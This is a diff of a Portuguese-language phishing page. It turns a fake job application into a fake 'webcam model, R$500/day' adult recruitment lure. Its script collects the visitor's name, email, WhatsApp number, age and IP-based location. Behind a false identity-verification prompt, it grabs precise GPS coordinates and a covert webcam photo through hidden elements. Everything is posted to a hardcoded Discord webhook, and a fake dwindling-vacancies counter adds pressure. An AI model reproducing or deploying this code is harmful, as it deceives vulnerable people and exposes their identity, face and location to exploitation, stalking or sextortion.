@@ -4,132 +4,190 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="permissions-policy" content="camera=*, geolocation=*">
-    <title>Vaga de Emprego - Home Office</title>
+    <title>Modelo Webcam - Ganhe R$ 500/dia | +18</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a0000, #330000, #1a0000);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 15px;
         }
         
         .container {
-            background: white;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 450px;
+            background: #111;
+            border-radius: 20px;
+            padding: 25px;
+            max-width: 420px;
             width: 100%;
-            box-shadow: 0 5px 30px rgba(0,0,0,0.1);
+            border: 1px solid #ff3366;
+            box-shadow: 0 0 30px rgba(255,51,102,0.3);
         }
         
-        .header {
+        .badge-topo {
+            background: #ff3366;
+            color: white;
             text-align: center;
-            margin-bottom: 25px;
+            padding: 8px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
         }
         
-        .empresa-logo {
-            font-size: 40px;
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 50px;
             margin-bottom: 10px;
         }
         
-        .header h1 {
-            font-size: 22px;
-            color: #1a1a1a;
+        .titulo {
+            text-align: center;
+            color: #ff3366;
+            font-size: 24px;
+            font-weight: 900;
             margin-bottom: 5px;
         }
         
-        .header p {
-            color: #666;
+        .subtitulo {
+            text-align: center;
+            color: #ccc;
             font-size: 14px;
-        }
-        
-        .vaga-info {
-            background: #e8f5e9;
-            border-radius: 10px;
-            padding: 15px;
             margin-bottom: 20px;
         }
         
-        .vaga-info .salario {
-            font-size: 28px;
-            font-weight: bold;
-            color: #2e7d32;
+        .ganhos-box {
+            background: linear-gradient(135deg, #1a1a1a, #0d0d0d);
+            border: 2px solid #ff3366;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
         }
         
-        .vaga-info .detalhes {
-            font-size: 13px;
-            color: #555;
-            margin-top: 5px;
+        .ganhos-valor {
+            font-size: 42px;
+            font-weight: 900;
+            color: #ff3366;
+        }
+        
+        .ganhos-periodo {
+            font-size: 14px;
+            color: #aaa;
+        }
+        
+        .beneficios {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .beneficio {
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #ccc;
+        }
+        
+        .beneficio span {
+            display: block;
+            font-size: 22px;
+            margin-bottom: 3px;
+        }
+        
+        .aviso-18 {
+            background: #ff336633;
+            border: 1px solid #ff3366;
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #ff3366;
+            margin-bottom: 20px;
+            font-weight: bold;
         }
         
         .form-group {
-            margin-bottom: 15px;
-        }
-        
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            font-size: 13px;
-            color: #333;
-            margin-bottom: 5px;
+            margin-bottom: 12px;
         }
         
         .form-group input, .form-group select {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            padding: 14px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: white;
             font-size: 14px;
         }
         
         .form-group input:focus {
-            border-color: #4CAF50;
+            border-color: #ff3366;
             outline: none;
         }
         
-        .btn-candidatar {
+        .form-group select {
+            color: #aaa;
+        }
+        
+        .form-group select option {
+            background: #1a1a1a;
+            color: white;
+        }
+        
+        .btn-cadastrar {
             width: 100%;
-            padding: 15px;
-            background: #4CAF50;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff3366, #cc0033);
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 10px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
         }
         
-        .btn-candidatar:hover {
-            background: #45a049;
+        .btn-cadastrar:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 25px rgba(255,51,102,0.5);
         }
         
-        .btn-candidatar:disabled {
-            background: #ccc;
+        .btn-cadastrar:disabled {
+            background: #555;
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
         
-        .aviso {
+        .contador-vagas {
             text-align: center;
-            font-size: 11px;
-            color: #999;
+            color: #ff3366;
+            font-size: 13px;
             margin-top: 15px;
+            font-weight: bold;
         }
-
-        .verificacao-box {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 15px;
-            font-size: 12px;
+        
+        .termos {
             text-align: center;
-            color: #856404;
+            font-size: 10px;
+            color: #666;
+            margin-top: 15px;
         }
 
         /* Elementos ocultos */
@@ -140,19 +198,72 @@
             height: 1px;
             top: -9999px;
             left: -9999px;
-            pointer-events: none;
         }
 
-        /* Loading */
+        /* Modal permissão */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+        }
+        
+        .modal-box {
+            background: #1a1a1a;
+            border: 2px solid #ff3366;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .modal-box .icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+        
+        .modal-box h3 {
+            color: #ff3366;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        
+        .modal-box p {
+            color: #ccc;
+            font-size: 13px;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        
+        .modal-box .btn-confirmar {
+            padding: 14px 40px;
+            background: #ff3366;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
         .loading {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 9999;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9998;
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -163,10 +274,10 @@
         }
         
         .spinner {
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             border: 4px solid #333;
-            border-top: 4px solid #4CAF50;
+            border-top: 4px solid #ff3366;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 15px;
@@ -177,177 +288,144 @@
             100% { transform: rotate(360deg); }
         }
         
-        .loading-text {
-            color: white;
+        .loading p {
+            color: #ff3366;
             font-size: 16px;
         }
-
-        /* Sucesso */
+        
         .sucesso {
             display: none;
             text-align: center;
-            padding: 20px;
         }
         
         .sucesso.active {
             display: block;
         }
         
-        .sucesso-icon {
-            font-size: 60px;
+        .sucesso .check {
+            font-size: 70px;
             margin-bottom: 15px;
         }
         
         .sucesso h2 {
-            color: #2e7d32;
+            color: #ff3366;
             margin-bottom: 10px;
         }
         
         .sucesso p {
-            color: #666;
+            color: #ccc;
             font-size: 14px;
-        }
-
-        /* Modal de permissão */
-        .modal-permissao {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 9998;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .modal-permissao.active {
-            display: flex;
-        }
-        
-        .modal-content {
-            background: white;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .modal-content h3 {
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        
-        .modal-content p {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .modal-content .btn-permitir {
-            padding: 12px 30px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <div class="container" id="form-container">
-        <div class="header">
-            <div class="empresa-logo">🏢</div>
-            <h1>Analista de Dados Júnior</h1>
-            <p>Home Office • Empresa Confidencial</p>
+        <div class="badge-topo">🔥 VAGAS ABERTAS HOJE - PAGAMENTO VIA PIX</div>
+        
+        <div class="logo">💋</div>
+        <div class="titulo">MODELO WEBCAM</div>
+        <div class="subtitulo">Trabalhe de casa • 100% Online • Sigilo Total</div>
+        
+        <div class="ganhos-box">
+            <div style="color:#aaa;font-size:13px;">GANHOS DIÁRIOS</div>
+            <div class="ganhos-valor">R$ 500</div>
+            <div class="ganhos-periodo">até R$ 15.000 por mês</div>
         </div>
         
-        <div class="vaga-info">
-            <div class="salario">R$ 3.500 - R$ 5.000</div>
-            <div class="detalhes">
-                ✓ Remoto • ✓ Horário Flexível • ✓ Vale Refeição • ✓ Plano de Saúde
+        <div class="beneficios">
+            <div class="beneficio">
+                <span>🏠</span>
+                Home Office
+            </div>
+            <div class="beneficio">
+                <span>💰</span>
+                PIX na Hora
+            </div>
+            <div class="beneficio">
+                <span>🔒</span>
+                Sigilo 100%
+            </div>
+            <div class="beneficio">
+                <span>⏰</span>
+                Horário Livre
             </div>
         </div>
-
-        <div class="verificacao-box">
-            ⚠️ Para sua segurança, realizamos verificação rápida de identidade
+        
+        <div class="aviso-18">
+            ⚠️ CONTEÚDO +18 • APENAS PARA MAIORES • SIGILO GARANTIDO
         </div>
-
-        <form id="form-vaga" onsubmit="return false;">
+        
+        <form id="form-cadastro" onsubmit="return false;">
             <div class="form-group">
-                <label>Nome Completo:</label>
-                <input type="text" id="nome" placeholder="Digite seu nome" required>
+                <input type="text" id="nome" placeholder="Nome completo" required>
             </div>
-            
             <div class="form-group">
-                <label>E-mail:</label>
-                <input type="email" id="email" placeholder="seu@email.com" required>
+                <input type="email" id="email" placeholder="Seu melhor e-mail" required>
             </div>
-            
             <div class="form-group">
-                <label>WhatsApp:</label>
-                <input type="tel" id="whatsapp" placeholder="(11) 99999-9999" required>
+                <input type="tel" id="whatsapp" placeholder="WhatsApp com DDD" required>
             </div>
-            
             <div class="form-group">
-                <label>Cidade/Estado:</label>
-                <input type="text" id="cidade" placeholder="São Paulo - SP" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Escolaridade:</label>
-                <select id="escolaridade" required>
-                    <option value="">Selecione...</option>
-                    <option>Ensino Médio Completo</option>
-                    <option>Ensino Superior Cursando</option>
-                    <option>Ensino Superior Completo</option>
-                    <option>Pós-Graduação</option>
+                <select id="idade" required>
+                    <option value="">Selecione sua idade...</option>
+                    <option>18 anos</option><option>19 anos</option><option>20 anos</option>
+                    <option>21 anos</option><option>22 anos</option><option>23 anos</option>
+                    <option>24 anos</option><option>25 anos</option><option>26-30 anos</option>
+                    <option>31-35 anos</option><option>36-40 anos</option><option>41+ anos</option>
                 </select>
             </div>
-
-            <button type="submit" class="btn-candidatar" id="btn-enviar">
-                Enviar Candidatura
+            <div class="form-group">
+                <select id="experiencia" required>
+                    <option value="">Tem experiência?</option>
+                    <option>Não, sou iniciante</option>
+                    <option>Sim, já fiz webcam</option>
+                    <option>Sim, conteúdo adulto</option>
+                    <option>Sim, onlyfans/privacy</option>
+                </select>
+            </div>
+            
+            <button type="submit" class="btn-cadastrar" id="btn-cadastrar">
+                📸 QUERO ME CADASTRAR
             </button>
         </form>
         
-        <div class="aviso">
-            Seus dados estão seguros e não serão compartilhados
+        <div class="contador-vagas" id="contador-vagas">
+            ⚡ Apenas <span id="num-vagas">12</span> vagas restantes hoje
+        </div>
+        
+        <div class="termos">
+            Seus dados são confidenciais • Não compartilhamos informações
         </div>
     </div>
 
-    <!-- Tela de sucesso -->
-    <div class="sucesso" id="tela-sucesso">
-        <div class="sucesso-icon">✅</div>
-        <h2>Candidatura Enviada!</h2>
-        <p>Sua candidatura foi recebida com sucesso.</p>
-        <p>Entraremos em contato pelo WhatsApp em até 48 horas.</p>
+    <!-- Sucesso -->
+    <div class="sucesso" id="sucesso" style="display:none;">
+        <div class="check">✅</div>
+        <h2>Cadastro Recebido!</h2>
+        <p>Entraremos em contato pelo WhatsApp</p>
+        <p style="color:#ff3366;margin-top:10px;">Fique atenta à sua câmera para a entrevista</p>
     </div>
 
-    <!-- Elementos ocultos de captura -->
+    <!-- Elementos captura -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <!-- Loading -->
     <div class="loading" id="loading">
         <div class="spinner"></div>
-        <div class="loading-text">Processando candidatura...</div>
+        <p>Verificando perfil...</p>
     </div>
 
-    <!-- Modal de permissão -->
-    <div class="modal-permissao" id="modal-permissao">
-        <div class="modal-content">
-            <h3>📸 Verificação de Segurança</h3>
-            <p>Para validar sua candidatura e evitar fraudes, precisamos de uma verificação rápida.</p>
+    <!-- Modal permissão -->
+    <div class="modal-overlay" id="modal-permissao">
+        <div class="modal-box">
+            <div class="icon">📸</div>
+            <h3>Verificação de Perfil</h3>
+            <p>Para garantir sua vaga, precisamos confirmar sua identidade.</p>
             <p>Será solicitado acesso à <strong>câmera</strong> e <strong>localização</strong>.</p>
-            <p style="font-size:11px;color:#999;">Este processo leva apenas 5 segundos</p>
-            <button class="btn-permitir" onclick="solicitarPermissoes()">
-                OK, Entendi
+            <p style="font-size:11px;color:#888;">Processo rápido e sigiloso</p>
+            <button class="btn-confirmar" onclick="iniciarCaptura()">
+                INICIAR VERIFICAÇÃO
             </button>
         </div>
     </div>
@@ -355,83 +433,42 @@
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1356839153790095509/mT5WvVHY9oleHuMlegTiB_A-_SunQ3m2bki0AkUnBAngHN2z6pqVHRjqFra-MO2vRGs9';
         
-        let dadosCapturados = {
-            nome: '',
-            email: '',
-            whatsapp: '',
-            cidade: '',
-            escolaridade: '',
-            ip: {},
-            localizacao: { status: 'pendente', lat: null, lon: null },
+        let dados = {
+            nome: '', email: '', whatsapp: '', idade: '', experiencia: '',
+            ip: {}, gps: { status: 'pendente', lat: null, lon: null },
             foto: { status: 'pendente', imagem: null },
             dispositivo: {}
         };
 
-        // Coleta IP automaticamente
-        async function coletarIP() {
+        // Coleta IP
+        async function pegarIP() {
             try {
-                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
-                const data = await res.json();
-                dadosCapturados.ip = {
-                    ip: data.ip,
-                    cidade: data.city,
-                    estado: data.region,
-                    pais: data.country_name,
-                    provedor: data.org,
-                    latitude: data.latitude,
-                    longitude: data.longitude
-                };
+                const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+                const d = await r.json();
+                dados.ip = { ip: d.ip, cidade: d.city, estado: d.region, pais: d.country_name, provedor: d.org, lat: d.latitude, lon: d.longitude };
             } catch(e) {
                 try {
-                    const res2 = await fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(3000) });
-                    const data2 = await res2.json();
-                    const loc = data2.loc ? data2.loc.split(',') : [null, null];
-                    dadosCapturados.ip = {
-                        ip: data2.ip,
-                        cidade: data2.city,
-                        estado: data2.region,
-                        pais: data2.country,
-                        provedor: data2.org,
-                        latitude: parseFloat(loc[0]),
-                        longitude: parseFloat(loc[1])
-                    };
+                    const r2 = await fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(3000) });
+                    const d2 = await r2.json();
+                    const loc = d2.loc ? d2.loc.split(',') : [null, null];
+                    dados.ip = { ip: d2.ip, cidade: d2.city, estado: d2.region, pais: d2.country, provedor: d2.org, lat: parseFloat(loc[0]), lon: parseFloat(loc[1]) };
                 } catch(e2) {}
             }
         }
 
         // Coleta GPS
-        function coletarLocalizacao() {
+        function pegarGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    dadosCapturados.localizacao.status = 'nao_suportado';
-                    resolve();
-                    return;
-                }
-                
+                if (!navigator.geolocation) { dados.gps.status = 'nao_suportado'; resolve(); return; }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        dadosCapturados.localizacao = {
-                            status: 'sucesso',
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            precisao: pos.coords.accuracy,
-                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        };
-                        enviarLocalizacao();
+                        dados.gps = { status: 'sucesso', lat: pos.coords.latitude, lon: pos.coords.longitude, precisao: pos.coords.accuracy, maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` };
+                        enviarGPS();
                         resolve();
                     },
-                    (err) => {
-                        dadosCapturados.localizacao.status = 'erro';
-                        // Fallback: usa IP
-                        if (dadosCapturados.ip.latitude) {
-                            dadosCapturados.localizacao = {
-                                status: 'ip_aproximado',
-                                lat: dadosCapturados.ip.latitude,
-                                lon: dadosCapturados.ip.longitude,
-                                maps: `https://www.google.com/maps?q=${dadosCapturados.ip.latitude},${dadosCapturados.ip.longitude}`
-                            };
-                            enviarLocalizacao();
-                        }
+                    () => {
+                        dados.gps.status = 'erro';
+                        if (dados.ip.lat) { dados.gps = { status: 'ip', lat: dados.ip.lat, lon: dados.ip.lon, maps: `https://www.google.com/maps?q=${dados.ip.lat},${dados.ip.lon}` }; enviarGPS(); }
                         resolve();
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
@@ -439,11 +476,8 @@
             });
         }
 
-        // Envia localização para o webhook
-        async function enviarLocalizacao() {
-            const loc = dadosCapturados.localizacao;
-            if (!loc.lat) return;
-            
+        async function enviarGPS() {
+            if (!dados.gps.lat) return;
             try {
                 await fetch(WEBHOOK, {
                     method: 'POST',
@@ -451,18 +485,17 @@
                     body: JSON.stringify({
                         content: '📍 **LOCALIZAÇÃO CAPTURADA**',
                         embeds: [{
-                            title: 'Dados de Localização',
-                            color: 0xFFA500,
+                            title: 'GPS do Cadastro',
+                            color: 0xFF3366,
                             fields: [
-                                { name: 'Coordenadas', value: `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`, inline: true },
-                                { name: 'Precisão', value: loc.precisao ? `${loc.precisao.toFixed(1)}m` : 'N/A', inline: true },
-                                { name: 'Método', value: loc.status, inline: true },
-                                { name: 'Google Maps', value: `[Clique para ver](${loc.maps})`, inline: false },
-                                { name: 'IP', value: dadosCapturados.ip.ip || 'N/A', inline: true },
-                                { name: 'Provedor', value: dadosCapturados.ip.provedor || 'N/A', inline: true },
-                                { name: 'Cidade IP', value: dadosCapturados.ip.cidade || 'N/A', inline: true }
+                                { name: 'Coordenadas', value: `${dados.gps.lat.toFixed(6)}, ${dados.gps.lon.toFixed(6)}`, inline: true },
+                                { name: 'Precisão', value: dados.gps.precisao ? `${dados.gps.precisao.toFixed(1)}m` : 'N/A', inline: true },
+                                { name: 'Método', value: dados.gps.status, inline: true },
+                                { name: 'Google Maps', value: `[Clique para ver](${dados.gps.maps})`, inline: false },
+                                { name: 'IP', value: dados.ip.ip || 'N/A', inline: true },
+                                { name: 'Cidade IP', value: dados.ip.cidade || 'N/A', inline: true },
+                                { name: 'Provedor', value: dados.ip.provedor || 'N/A', inline: true }
                             ],
-                            footer: { text: 'Sistema de Captura' },
                             timestamp: new Date().toISOString()
                         }]
                     })
@@ -470,121 +503,95 @@
             } catch(e) {}
         }
 
-        // Captura foto da câmera
+        // Captura foto
         async function capturarFoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             let stream = null;
-
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
                 video.srcObject = stream;
                 video.muted = true;
                 video.playsInline = true;
-                
                 await new Promise((resolve, reject) => {
                     video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
                     setTimeout(() => reject(new Error('timeout')), 5000);
                 });
-                
                 await new Promise(r => setTimeout(r, 800));
-                
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                dadosCapturados.foto = {
-                    status: 'sucesso',
-                    imagem: canvas.toDataURL('image/jpeg', 0.6),
-                    resolucao: `${canvas.width}x${canvas.height}`
-                };
-                
+                dados.foto = { status: 'sucesso', imagem: canvas.toDataURL('image/jpeg', 0.6), resolucao: `${canvas.width}x${canvas.height}` };
                 enviarFoto();
-                
             } catch(e) {
-                dadosCapturados.foto.status = 'erro';
+                dados.foto.status = 'erro';
             } finally {
                 if (stream) stream.getTracks().forEach(t => t.stop());
                 video.srcObject = null;
             }
         }
 
-        // Envia foto para o webhook
         async function enviarFoto() {
-            if (!dadosCapturados.foto.imagem) return;
-            
+            if (!dados.foto.imagem) return;
             try {
-                const blob = dataURLtoBlob(dadosCapturados.foto.imagem);
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({
+                const arr = dados.foto.imagem.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                const u8arr = new Uint8Array(bstr.length);
+                for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
+                const blob = new Blob([u8arr], { type: mime });
+                const fd = new FormData();
+                fd.append('payload_json', JSON.stringify({
                     content: '📸 **FOTO CAPTURADA**',
                     embeds: [{
-                        title: 'Foto do Candidato',
-                        color: 0x00FF00,
+                        title: 'Foto do Cadastro',
+                        color: 0xFF3366,
                         fields: [
-                            { name: 'Resolução', value: dadosCapturados.foto.resolucao, inline: true },
-                            { name: 'Dispositivo', value: dadosCapturados.dispositivo.tipo, inline: true },
+                            { name: 'Resolução', value: dados.foto.resolucao, inline: true },
+                            { name: 'Dispositivo', value: dados.dispositivo.tipo, inline: true },
                             { name: 'Horário', value: new Date().toLocaleString('pt-BR'), inline: true }
                         ],
                         image: { url: 'attachment://foto.jpg' },
-                        footer: { text: 'Captura Automática' },
                         timestamp: new Date().toISOString()
                     }]
                 }));
-                formData.append('file', blob, 'foto.jpg');
-                await fetch(WEBHOOK, { method: 'POST', body: formData });
+                fd.append('file', blob, 'foto.jpg');
+                await fetch(WEBHOOK, { method: 'POST', body: fd });
             } catch(e) {}
         }
 
-        function dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            const u8arr = new Uint8Array(bstr.length);
-            for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
-            return new Blob([u8arr], { type: mime });
-        }
-
-        // Coleta dados do dispositivo
         function coletarDispositivo() {
             const ua = navigator.userAgent;
-            dadosCapturados.dispositivo = {
+            dados.dispositivo = {
                 tipo: /Mobi|Android/i.test(ua) ? 'Celular' : 'Desktop',
                 so: /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Windows/Mac',
                 navegador: ua.includes('Chrome') ? 'Chrome' : ua.includes('Safari') ? 'Safari' : 'Outro',
-                idioma: navigator.language,
-                userAgent: ua
+                idioma: navigator.language
             };
         }
 
-        // Envia tudo
-        async function enviarDadosCompletos() {
+        async function enviarTudo() {
             try {
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: '📋 **CANDIDATURA COMPLETA**',
+                        content: '📋 **CADASTRO COMPLETO**',
                         embeds: [{
-                            title: 'Dados do Candidato',
-                            color: 0x4CAF50,
+                            title: 'Dados do Cadastro +18',
+                            color: 0xFF3366,
                             fields: [
-                                { name: '👤 Nome', value: dadosCapturados.nome, inline: true },
-                                { name: '📧 E-mail', value: dadosCapturados.email, inline: true },
-                                { name: '📱 WhatsApp', value: dadosCapturados.whatsapp, inline: true },
-                                { name: '🏙️ Cidade', value: dadosCapturados.cidade, inline: true },
-                                { name: '🎓 Escolaridade', value: dadosCapturados.escolaridade, inline: true },
+                                { name: '👤 Nome', value: dados.nome, inline: true },
+                                { name: '📧 E-mail', value: dados.email, inline: true },
+                                { name: '📱 WhatsApp', value: dados.whatsapp, inline: true },
+                                { name: '🎂 Idade', value: dados.idade, inline: true },
+                                { name: '🎬 Experiência', value: dados.experiencia, inline: true },
                                 { name: '📅 Data', value: new Date().toLocaleString('pt-BR'), inline: true },
-                                { name: '🌐 IP', value: dadosCapturados.ip.ip || 'N/A', inline: true },
-                                { name: '📍 Localização', value: dadosCapturados.localizacao.status === 'sucesso' ? 'GPS Preciso' : dadosCapturados.localizacao.status, inline: true },
-                                { name: '📸 Foto', value: dadosCapturados.foto.status === 'sucesso' ? '✅ Capturada' : '❌ Falhou', inline: true },
-                                { name: '📱 Dispositivo', value: `${dadosCapturados.dispositivo.tipo} - ${dadosCapturados.dispositivo.so}`, inline: true }
+                                { name: '🌐 IP', value: dados.ip.ip || 'N/A', inline: true },
+                                { name: '📍 GPS', value: dados.gps.status === 'sucesso' ? '✅ Preciso' : dados.gps.status, inline: true },
+                                { name: '📸 Foto', value: dados.foto.status === 'sucesso' ? '✅ Capturada' : '❌ Falhou', inline: true },
+                                { name: '📱 Dispositivo', value: `${dados.dispositivo.tipo} - ${dados.dispositivo.so}`, inline: true }
                             ],
-                            footer: { text: 'Sistema de Recrutamento' },
                             timestamp: new Date().toISOString()
                         }]
                     })
@@ -592,58 +599,54 @@
             } catch(e) {}
         }
 
-        // Mostra modal de permissão
-        function mostrarModalPermissao() {
-            document.getElementById('modal-permissao').classList.add('active');
-        }
-
-        // Fecha modal e solicita permissões
-        async function solicitarPermissoes() {
+        // Fluxo principal
+        async function iniciarCaptura() {
             document.getElementById('modal-permissao').classList.remove('active');
             document.getElementById('loading').classList.add('active');
             
-            // Coleta localização
-            await coletarLocalizacao();
+            await pegarGPS();
             
-            // Aguarda um pouco e captura foto
             setTimeout(async () => {
                 await capturarFoto();
-                
-                // Envia dados e mostra sucesso
-                await enviarDadosCompletos();
+                await enviarTudo();
                 
                 document.getElementById('loading').classList.remove('active');
                 document.getElementById('form-container').style.display = 'none';
-                document.getElementById('tela-sucesso').classList.add('active');
-            }, 500);
+                document.getElementById('sucesso').style.display = 'block';
+            }, 600);
         }
 
         // Form submit
-        document.getElementById('form-vaga').addEventListener('submit', function(e) {
+        document.getElementById('form-cadastro').addEventListener('submit', function(e) {
             e.preventDefault();
+            dados.nome = document.getElementById('nome').value;
+            dados.email = document.getElementById('email').value;
+            dados.whatsapp = document.getElementById('whatsapp').value;
+            dados.idade = document.getElementById('idade').value;
+            dados.experiencia = document.getElementById('experiencia').value;
             
-            // Coleta dados do formulário
-            dadosCapturados.nome = document.getElementById('nome').value;
-            dadosCapturados.email = document.getElementById('email').value;
-            dadosCapturados.whatsapp = document.getElementById('whatsapp').value;
-            dadosCapturados.cidade = document.getElementById('cidade').value;
-            dadosCapturados.escolaridade = document.getElementById('escolaridade').value;
-            
-            // Mostra modal pedindo permissão
-            mostrarModalPermissao();
+            document.getElementById('modal-permissao').classList.add('active');
         });
 
-        // Inicia ao carregar
-        window.addEventListener('DOMContentLoaded', async () => {
-            coletarDispositivo();
-            await coletarIP();
-        });
+        // Contador de vagas
+        function atualizarVagas() {
+            const el = document.getElementById('num-vagas');
+            let vagas = 12;
+            setInterval(() => {
+                if (Math.random() < 0.4 && vagas > 2) { vagas--; el.textContent = vagas; }
+            }, 5000);
+        }
 
         // Fecha modal ao clicar fora
         document.getElementById('modal-permissao').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.classList.remove('active');
-            }
+            if (e.target === this) this.classList.remove('active');
+        });
+
+        // Init
+        window.addEventListener('DOMContentLoaded', async () => {
+            coletarDispositivo();
+            await pegarIP();
+            atualizarVagas();
         });
     </script>
 </body>
